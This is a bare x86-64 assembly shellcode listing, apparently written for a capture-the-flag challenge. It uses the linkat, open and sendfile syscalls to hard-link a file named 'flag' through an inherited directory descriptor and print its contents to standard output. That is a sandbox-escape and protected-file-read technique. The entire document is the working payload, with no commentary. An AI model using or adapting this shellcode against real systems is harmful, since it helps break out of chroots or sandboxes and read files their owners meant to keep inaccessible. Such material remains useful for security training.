xor rax, rax
mov eax, 0x67616c66
push rax
push rsp

xor rax, rax
mov rax, 0x6f616d6c2f
push rax
push rsp

xor r8, r8 
mov r10,  [RSP + 0] 
xor rdx, rdx 
mov rsi, [RSP + 16] 
mov rdi, 0x3
mov rax, 0x109
syscall ; Syscall
add RSP, 32

xor rax, rax
mov eax, 0x6f616d6c
push rax
push rsp

xor rsi, rsi 
mov rdi, [RSP + 0] 
mov rax, 0x2
syscall ; Syscall
add RSP, 16

mov r10, 0xa
xor rdx, rdx 
mov rsi, 0x4
mov rdi, 0x1
mov rax, 0x28
syscall ; Syscall

